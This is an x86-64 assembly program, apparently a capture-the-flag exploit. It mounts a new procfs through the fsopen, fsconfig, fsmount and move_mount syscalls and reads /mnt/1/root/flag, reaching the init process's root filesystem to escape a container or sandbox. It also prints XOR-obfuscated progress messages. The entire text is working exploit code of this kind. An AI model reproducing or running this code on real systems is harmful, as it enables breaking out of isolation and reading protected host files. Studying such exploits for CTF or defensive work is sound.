
section .data
    proc db "proc", 0
    errMessage db "[-] Error: negative return value.", 0xa, 0x0

section .text
global _start
_start:
; log
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0xa74737269662073
    xor [rsp], rax
    mov rax, 0x66636f727020746e
    push rax
    mov rax, 0x756f4d205d2a5b09
    push rax
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0xa3a747261747320
    xor [rsp], rax
    mov rax, 0x6e6f69746174696f
    push rax
    mov rax, 0x6c707845205d2b5b
    push rax
    push 1
    pop rax
    push (1) 
    pop rdi
    push 0x30
    pop rdx
    mov rsi, rsp
    syscall

; fsopen("proc", FSOPEN_CLOEXEC)
    mov rdi, proc
    push 1
    pop rsi
    mov rax, 0x1ae
    syscall
    test rax, rax
    js .errExit

; setting up stack to store vars
    mov rbp, rsp
    push rax ; rbp - 8

; fsconfig(fs_fd, FSCONFIG_SET_FLAG, NULL, NULL, 0)
    mov rdi, [rbp - 8]
    push 6
    pop rsi
    xor rdx, rdx
    xor rcx, rcx
    mov rax, 431
    syscall
    test rax, rax
    js .errExit

; fsmount(fs_fd, FSOPEN_CLOEXEC, MOUNT_ATTR_RELATIME)
    mov rdi, [rbp - 8]
    push 1
    pop rsi
    xor rdx, rdx
    mov rax, 432
    syscall
    test rax, rax
    js .errExit
    push rax ; rbp - 0x10

    mov rdi, [rbp - 8]
    mov rax, 3
    syscall

; mkdir /mnt
    push 0x746e6d2f
    mov rdi, rsp
    xor esi, esi
    mov si, 0x309
    push 0x53
    pop rax
    syscall
    test rax, rax
    js .errExit

; move_mount(fd, "", AT_FDCWD, "/mnt", MOVE_MOUNT_F_EMPTY_PATH)
    mov rdi, [rbp - 0x10]
    push 0
    mov rsi, [rbp - 0x20]
    mov rdx, -100
    mov r10, [rbp - 0x18]
    mov r8, 4
    mov rax, 429
    syscall
    test rax, rax
    js .errExit

; push b'/mnt/1/root/flag\x00'
    push 1
    dec byte [rsp]
    mov rax, 0x67616c662f746f6f
    push rax
    mov rax, 0x722f312f746e6d2f
    push rax
    push 2
    pop rax
    mov rdi, rsp
    xor esi, esi
    syscall
    mov r10d, 0x7fffffff
    mov rsi, rax
    push 0x28
    pop rax
    push 1
    pop rdi
    cdq
    syscall

; exit(0)
    mov eax, 60
    xor edi, edi
    syscall

.errExit:
    push 1
    pop rax
    push 1
    pop rdi
    mov rsi, errMessage
    mov rdx, 35
    syscall
    mov rax, 60
    mov rdi, 1
    syscall
